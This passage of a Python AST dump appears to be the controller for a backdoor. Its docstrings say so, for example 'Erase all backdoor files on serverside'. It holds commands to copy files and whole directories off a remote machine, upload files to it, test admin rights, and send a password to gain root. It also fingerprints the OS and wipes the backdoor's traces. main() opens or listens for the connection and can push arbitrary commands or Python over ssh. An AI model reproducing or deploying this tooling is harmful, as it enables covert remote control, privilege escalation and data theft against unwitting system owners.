ctx=Store())], value=List(elts=[Num(n=512), Num(n=64), Num(n=8), Num(n=1)], ctx=Load())), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='transfer '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Assign(targets=[Name(id='message', ctx=Store())], value=Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='message', ctx=Load())], keywords=[])), If(test=Compare(left=Name(id='message', ctx=Load()), ops=[Eq()], comparators=[Str(s='That file exists and will be transfered.')]), body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_chunk_transfer', ctx=Load()), args=[Call(func=Attribute(value=Str(s='./{}'), attr='format', ctx=Load()), args=[Subscript(value=Call(func=Attribute(value=Name(id='arg', ctx=Load()), attr='split', ctx=Load()), args=[Str(s='/')], keywords=[]), slice=Index(value=UnaryOp(op=USub(), operand=Num(n=1))), ctx=Load())], keywords=[]), Name(id='chunk_sizes', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load())], keywords=[])], keywords=[]))], orelse=[If(test=Compare(left=Name(id='message', ctx=Load()), ops=[Eq()], comparators=[Str(s='That directory exists and its contents will be transfered.')]), body=[Assign(targets=[Name(id='cont_signal', ctx=Store())], value=Call(func=Name(id='input', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[])), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Name(id='cont_signal', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), If(test=Compare(left=Name(id='cont_signal', ctx=Load()), ops=[Eq()], comparators=[Str(s='y')]), body=[Assign(targets=[Name(id='num_of_files', ctx=Store())], value=Call(func=Name(id='int', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[])), For(target=Name(id='path', ctx=Store()), iter=Call(func=Name(id='range', ctx=Load()), args=[Name(id='num_of_files', ctx=Load())], keywords=[]), body=[Assign(targets=[Name(id='file_path', ctx=Store())], value=Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Assign(targets=[Name(id='message', ctx=Store())], value=BinOp(left=Str(s='./'), op=Add(), right=Call(func=Attribute(value=Str(s='/'), attr='join', ctx=Load()), args=[Subscript(value=Call(func=Attribute(value=Name(id='file_path', ctx=Load()), attr='split', ctx=Load()), args=[Str(s='/')], keywords=[]), slice=Slice(lower=None, upper=UnaryOp(op=USub(), operand=Num(n=1)), step=None), ctx=Load())], keywords=[]))), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='message', ctx=Load())], keywords=[])), Try(body=[Expr(value=Call(func=Attribute(value=Name(id='os', ctx=Load()), attr='makedirs', ctx=Load()), args=[Name(id='message', ctx=Load())], keywords=[]))], handlers=[ExceptHandler(type=None, name=None, body=[Pass()])], orelse=[], finalbody=[]), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_chunk_transfer', ctx=Load()), args=[Name(id='file_path', ctx=Load()), Name(id='chunk_sizes', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load())], keywords=[])], keywords=[]))], orelse=[])], orelse=[])], orelse=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='no worky')], keywords=[]))])])], decorator_list=[], returns=None), FunctionDef(name='do_transferto', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Transfer specified file to specific directory on server. The argument should be where on the other computer you would like to transfer the file.')), Assign(targets=[Name(id='to_open', ctx=Store())], value=Call(func=Name(id='input', ctx=Load()), args=[Str(s='File path:\n')], keywords=[])), Try(body=[Assign(targets=[Name(id='opened_file', ctx=Store())], value=Call(func=Name(id='open', ctx=Load()), args=[Name(id='to_open', ctx=Load())], keywords=[keyword(arg='mode', value=Str(s='rb'))])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='That file exists and will be transfered.')], keywords=[])), Assign(targets=[Name(id='file_open', ctx=Store())], value=NameConstant(value=True))], handlers=[ExceptHandler(type=None, name=None, body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='That file does not exist.')], keywords=[])), Assign(targets=[Name(id='file_open', ctx=Store())], value=NameConstant(value=False))])], orelse=[], finalbody=[]), If(test=Name(id='file_open', ctx=Load()), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='transferto '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='message', ctx=Load())], keywords=[])), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Name(id='to_open', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Assign(targets=[Name(id='filesize', ctx=Store())], value=Attribute(value=Call(func=Attribute(value=Name(id='os', ctx=Load()), attr='stat', ctx=Load()), args=[Name(id='arg', ctx=Load())], keywords=[]), attr='st_size', ctx=Load())), Assign(targets=[Name(id='chunk_sizes', ctx=Store())], value=List(elts=[Num(n=512), Num(n=64), Num(n=8), Num(n=1)], ctx=Load())), Assign(targets=[Name(id='chunk_numbers', ctx=Store())], value=List(elts=[], ctx=Load())), For(target=Name(id='size', ctx=Store()), iter=Name(id='chunk_sizes', ctx=Load()), body=[Expr(value=Call(func=Attribute(value=Name(id='chunk_numbers', ctx=Load()), attr='append', ctx=Load()), args=[Call(func=Name(id='str', ctx=Load()), args=[BinOp(left=Name(id='filesize', ctx=Load()), op=FloorDiv(), right=Name(id='size', ctx=Load()))], keywords=[])], keywords=[])), Assign(targets=[Name(id='filesize', ctx=Store())], value=BinOp(left=Name(id='filesize', ctx=Load()), op=Mod(), right=Name(id='size', ctx=Load())))], orelse=[]), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Call(func=Attribute(value=Str(s=' '), attr='join', ctx=Load()), args=[Name(id='chunk_numbers', ctx=Load())], keywords=[]), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Assign(targets=[Name(id='filesize', ctx=Store())], value=Attribute(value=Call(func=Attribute(value=Name(id='os', ctx=Load()), attr='stat', ctx=Load()), args=[Name(id='arg', ctx=Load())], keywords=[]), attr='st_size', ctx=Load())), While(test=NameConstant(value=True), body=[If(test=Compare(left=Name(id='filesize', ctx=Load()), ops=[Lt()], comparators=[Num(n=1)]), body=[Break()], orelse=[]), Expr(value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load()), attr='send', ctx=Load()), args=[Call(func=Attribute(value=Name(id='opened_file', ctx=Load()), attr='read', ctx=Load()), args=[Num(n=1024)], keywords=[])], keywords=[])), AugAssign(target=Name(id='filesize', ctx=Store()), op=Sub(), value=Num(n=1024))], orelse=[]), Expr(value=Call(func=Attribute(value=Name(id='opened_file', ctx=Load()), attr='close', ctx=Load()), args=[], keywords=[]))], orelse=[])], decorator_list=[], returns=None), FunctionDef(name='do_admin', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Check if server account is admin.')), If(test=BoolOp(op=Or(), values=[Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Darwin')]), Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Linux')])]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='admin'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[]))], orelse=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='Action not available with {system}.'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='system', value=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()))])], keywords=[]))])], decorator_list=[], returns=None), FunctionDef(name='do_su', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Get root access if server account is admin. Enter password after "su".')), If(test=BoolOp(op=Or(), values=[Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Darwin')]), Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Linux')])]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='su '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[]))], orelse=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='Action not available with {system}.'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='system', value=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()))])], keywords=[]))])], decorator_list=[], returns=None), FunctionDef(name='do_system', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Get the server os.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='system'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_uname', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Get machine info: node, platform, processor, system version, and other info.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='uname '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_killattack', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Erase all backdoor files on serverside.')), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='Are you sure you want to erase all backdoor files on the serverside?')], keywords=[])), Assign(targets=[Name(id='erase', ctx=Store())], value=Call(func=Name(id='input', ctx=Load()), args=[Str(s='There is no going back. (y or n) ')], keywords=[])), If(test=Compare(left=Name(id='erase', ctx=Load()), ops=[Eq()], comparators=[Str(s='y')]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='killattack'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Return(value=NameConstant(value=True))], orelse=[])], decorator_list=[], returns=None)], decorator_list=[]), FunctionDef(name='main', args=arguments(args=[arg(arg='mode_input', annotation=None), arg(arg='key_input', annotation=None), arg(arg='ip_input', annotation=None), arg(arg='port_input', annotation=None), arg(arg='sendkey', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[Name(id='MODE', ctx=Load()), Name(id='KEY', ctx=Load()), Name(id='IP', ctx=Load()), Name(id='PORT', ctx=Load()), NameConstant(value=True)]), body=[Expr(value=Str(s='Main function')), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='mode_input', ctx=Load())], keywords=[])), If(test=BoolOp(op=Or(), values=[BoolOp(op=And(), values=[Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='active')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)]), Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='passive')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)])]), BoolOp(op=And(), values=[Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='active')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)]), Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='reactive')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)])]), BoolOp(op=And(), values=[Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='reactive')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)]), Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='passive')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)])])]), body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='Not a valid input')], keywords=[])), Raise(exc=Name(id='SystemExit', ctx=Load()), cause=None)], orelse=[If(test=Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='reactive')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)]), body=[While(test=NameConstant(value=True), body=[Assign(targets=[Name(id='what_type', ctx=Store())], value=Call(func=Name(id='input', ctx=Load()), args=[Str(s='Run a command or a python script? type cmd or exec (or exit to stop): ')], keywords=[])), If(test=Compare(left=Name(id='what_type', ctx=Load()), ops=[Eq()], comparators=[Str(s='exit')]), body=[Break()], orelse=[]), Assign(targets=[Name(id='what_to_run', ctx=Store())], value=Call(func=Name(id='input', ctx=Load()), args=[Str(s='Paste it in here:\n')], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='os', ctx=Load()), attr='system', ctx=Load()), args=[Call(func=Attribute(value=Str(s='ssh {cmd}@{ip}'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='cmd', value=BinOp(left=BinOp(left=BinOp(left=Str(s='runreactive-'), op=Add(), right=Name(id='what_type', ctx=Load())), op=Add(), right=Str(s='-')), op=Add(), right=Name(id='what_to_run', ctx=Load()))), keyword(arg='ip', value=Name(id='ip_input', ctx=Load()))])], keywords=[]))], orelse=[])], orelse=[If(test=Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='passive')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)]), body=[Assign(targets=[Name(id='connect', ctx=Store())], value=Call(func=Attribute(value=Name(id='socket', ctx=Load()), attr='socket', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='connect', ctx=Load()), attr='setsockopt', ctx=Load()), args=[Attribute(value=Name(id='socket', ctx=Load()), attr='SOL_SOCKET', ctx=Load()), Attribute(value=Name(id='socket', ctx=Load()), attr='SO_REUSEADDR', ctx=Load()), Num(n=1)], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='connect', ctx=Load()), attr='bind', ctx=Load()), args=[Tuple(elts=[Name(id='ip_input', ctx=Load()), Name(id='port_input', ctx=Load())], ctx=Load())], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='connect', ctx=Load()), attr='listen', ctx=Load()), args=[Num(n=1)], keywords=[])), Assign(targets=[Tuple(elts=[Name(id='client', ctx=Store()), Name(id='addr', ctx=Store())], ctx=Store())], value=Call(func=Attribute(value=Name(id='connect', ctx=Load()), attr='accept', ctx=Load()), args=[], keywords=[]))], orelse=[Assign(targets=[Name(id='client', ctx=Store())], value=Call(func=Attribute(value=Name(id='socket', ctx=Load()), attr='socket', ctx=Load()), args=[], keywords=[])), Try(body=[Expr(value=Call(func=Attribute(value=Name(id='client', ctx=Load()), attr='connect', ctx=Load()), args=[Tuple(elts=[Name(id='ip_input', ctx=Load()), Name(id='port_input', ctx=Load())], ctx=Load())], keywords=[]))], handlers=[ExceptHandler(type=Name(id='Exception', ctx=Load()), name='e', body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='Connection Failed: {}'), attr='format', ctx=Load()), args=[Name(id='e', ctx=Load())], keywords=[])], keywords=[])), Raise(exc=Name(id='SystemExit', ctx=Load()), cause=None)])], orelse=[], finalbody=[])])])]), If(test=Compare(left=Subscript(value=Name(id='mode_input', ctx=Load()), slice=Index(value=Str(s='reactive')), ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=False)]), body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='key'), Name(id='key_input', ctx=Load())], keywords=[])), If(test=Compare(left=Name(id='sendkey', ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=True)]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Call(func=Name(id='str', ctx=Load()), args=[BinOp(left=Name(id='key_input', ctx=Load()), op=Pow(), right=Num(n=2))], keywords=[]), NameConstant(value=None), Name(id='client', ctx=Load()), Num(n=2)], keywords=[]))], orelse=[]), Assign(targets=[Name(id='system', ctx=Store())], value=Call(func=Name(id='recv_message', ctx=Load()), args=[NameConstant(value=None), Name(id='client', ctx=Load())], keywords=[keyword(arg='lenoflenofmsg', value=Num(n=2))])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='You are connecting to a computer running the {kernel} operating system.'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='kernel', value=Name(id='system', ctx=Load()))])], keywords=[])), Assign(targets=[Name(id='commands', ctx=Store())], value=Call(func=Name(id='send_commands', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='commands', ctx=Load()), attr='cmdloop', ctx=Load()), args=[Name(id='client', ctx=Load()), Name(id='system', ctx=Load())], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='client', ctx=Load()), attr='close', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='Bye')], keywords=[]))], orelse=[])], decorator_list=[], returns=None), If(test=Compare(left=Name(id='__name__', ctx=Load()), ops=[Eq()], comparators=[Str(s='__main__')]), body=[Expr(value=Call(func=Name(id='main', ctx=Load()), args=[], keywords=[]))], orelse=[])])